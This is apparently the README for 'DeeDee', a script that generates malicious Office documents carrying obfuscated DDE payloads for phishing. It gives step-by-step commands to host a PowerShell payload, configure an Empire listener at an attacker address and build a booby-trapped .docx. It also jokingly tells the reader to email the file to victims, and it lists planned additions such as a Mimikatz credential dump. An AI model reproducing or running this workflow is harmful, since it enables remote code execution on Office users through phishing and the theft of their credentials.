<h2> DeeDee Office Payload Generator<h6>Baking Evil Cookies since 2017<br>Author: True Demon</h2>

<h3>Introduction</h3>

DeeDee is a script for quickly generating DDE Exploit payloads and inserting them into ready-made documents for
phishing attempts against MS office users. The purpose of the script is to simplify and reduce the steps necessary to insert a
malicious DDE payload into supported versions of Office documents. It accomplishes this by inserting the payload in raw XML 
into the document themselves complete with known obfuscation methods to ensure a successful delivery and execution. This is
accomplished by inserting a reliable download script in powershell into the DDE payload, which calls out to the attacker's web
server hosting their desired payload. Currently, Empire payloads have had the best success.

<h3>Procedure</h3>

Start by creating a powershell payload that you would like to run on the remote host. If you use base64 encoding, this must be
specified in the script later. Base64 encoding is definitely recommended for successful execution. Save the payload to a txt
file in a temporary directory and start up a web server. The Python Simple HTTP server is sufficient, but any web server will do.

<b>EXAMPLE:</b>
<pre>
cd /tmp/payloads
python3 http.server [port]
cp /tmp/empirepayload.txt /tmp/payloads/evil.txt
[*] Now you can then run deedee.py to create your malicious docx file.
</pre>

<br/>
<b>use -i for your input file [default = template/blank.docx]</b>

<pre>
<b>NOTE</b>: You must use the "blank.docx" file in /path/to/deedee/templates/ to start with. <br/>
You can edit any part of this document before or after you have run deedee, provided that you DO NOT MODIFY THE FOOTER.
It is recommended you edit it beforehand and save it to the templates folder. This way, you can use it again later.
</pre>

<b>use -o to specify where you would like your output to go</b>
<pre>
deedee@thekitchen:/# ./deedee.py -i templates/myphishing.docx -o /tmp/payloads/evilcookies.docx

Enter the path to your http server & empirepayload: 
> http://my-ip-addr/evil.txt

Granny DeeDee bakes up some magic cookies for your enjoyment...
and you can email the evilcookies.docx to share with your friends :)
</pre>
<br/>
<h3>Supported Techniques</h3>

    - Raw Powershell Payload insertion
    - Empire Web Delivery Method


<h3>Planned Additions</h3>

    - Empire & Metasploit specific payloads
    - QUOTE-SET-REF method obfuscation
    - Mimikatz dump payload
    - Invoke-MetasploitPayload method
    - Self-starting payload delivery web server


<h3>Instructions</h3>

<h4>USAGE</h4>
<pre>
deedee@thekitchen:/# ./deedee.py -h
usage: deedee.py [-h] [-i INPUT_FILE] [-o OUTPUT_FILE] [-c] [-v] [--debug]

optional arguments:
  -h, --help            show this help message and exit
  -i INPUT_FILE, --input_file INPUT_FILE
                        Payload carrier file
  -o OUTPUT_FILE, --output_file OUTPUT_FILE
                        File with payload attached
  -c, --custom_payload  Override the default web delivery method with a custom
                        CMD/PSH payload as a string
  -v, --verbose         Show verbose output
  --debug               Print debug statements
</pre>
<h4>Full Example</h4>

<h5>Start Your Webserver</h5>
<pre>
deedee@thekitchen:/# cd /tmp/payloads
deedee@thekitchen:/# python3 -m http.server 8443         // Remember whatever port number you use here...
</pre>

<h5>Generate your malicious payload</h5>
<pre>
deedee@thekitchen:/# /usr/share/empire/./empire
> listeners
> uselistener http
> set Port 443
> set Host 192.168.1.123
> execute
> launcher powershell
</pre>

<em>COPY THE ENCODED PAYLOAD AND SAVE IT TO YOUR WEB SERVER DIRECTORY (Ignore "powershell -nop -sta -w 1 -enc")</em>
<pre>
deedee@thekitchen:/# echo "MASSIVEEMPIREPAYLOADINBASE64HERE" > /tmp/payloads/evil.txt
</pre>

<h5>Now you're ready to create your phishing document...</h5>
<pre>
deedee@thekitchen:/# ./deedee.py -i ~/PhishingTemplates/inconspicuous.docx -o /tmp/payloads/evilscheme.docx

[!] Let's bake some evil cookies!

[*] First, we'll be needing some ingredients!
|	 First, mix up the powershell payload you want executed on the host with your favorite framework,
|	 save it as a text file, and host it on a local web server. Now I just need to know where to find it.
|	 URI to payload...
|	 (ex: http://evilserv.ninja/blabbity.txt)
|		 #>:http://192.168.1.123:8443/evil.txt                  // This is the full path to your web server with your empire payload
|	 Will you be using an encoded payload? [y/N] #>: N
[?] Would you like to leave a special note on the error message for your friend? [default: "for security reasons"]
[+] Grabbing my bag of magic XML...:                            // Loading the payload
[+] Checking for my recipe...                                   // Making sure you used blank.docx as your template
[+] Ah, here it is!                                             // Your document is compatible!
[+] Tossing three cups of evil into the XML...                  // Generating your payload with your web server address
[+] Added a teaspoon of powershell...                           // Setting up the powershell payload
[+] ...Some malicious intent, and a few naughty thoughts ;)     // Obfuscating the payload
[+] Mixing XML into the DOCX...                                 // Creating the XML files and rebuilding your docx
[+] The cookies are in the oven...                              // Ensures the docx is not corrupted
[+] DING! The evil cookies are done!                            // SUCCESS! :)
</pre>

<h3>Acknowledgements</h3>
<pre>
Michael Benich @benichmt1 - Provided a lot of additional research material necessary to create this exploit
<a href=https://sensepost.com/blog/2017/macro-less-code-exec-in-msword>Etienne Stalmans & Saif El-Sherei </a>- For their amazing, combined research efforts into DDE exploitation and obfuscation
Mike Czumak @SecuritySift - For his payload obfuscation methods & research
<a href=https://pwndizzle.blogspot.com/2017/03/office-document-macros-ole-actions-dde.html>PwnDizzle</a>                 - For his/her research provided on his blog
<a href=http://github.com/xillwillx>Vincent Yiu @vysecurity </a>  - For code concepts derived from his CactusTorch project
<a href=http://github.com/0xdeadbeefJERKY>0xdeadbeefJERKY</a>           - For code concepts derived from his Office-DDE-Payloads project
</pre>